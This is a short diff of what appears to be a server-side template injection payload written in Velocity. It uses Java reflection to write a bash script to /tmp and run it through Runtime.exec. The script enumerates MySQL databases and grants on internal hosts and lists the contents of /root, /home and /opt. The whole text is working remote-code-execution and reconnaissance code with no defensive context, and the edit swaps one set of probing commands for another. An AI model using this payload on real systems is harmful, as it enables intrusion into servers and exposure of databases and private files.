@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("echo ===DBS===; mysql -h10.18.19.53 -e 'show databases' 2>&1 | head -60; echo ===GRANTS===; mysql -h10.18.19.53 -e 'show grants' 2>&1 | head -20")
+$fw.write("echo ===3309===; mysql -h10.18.19.43 -P3309 -e 'show databases' 2>&1 | head -25; echo ===ROOTLS===; ls -la /root 2>&1 | head -45; echo ===HOME===; ls -la /home 2>&1 | head -20; echo ===OPT===; ls -la /opt 2>&1 | head -30")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
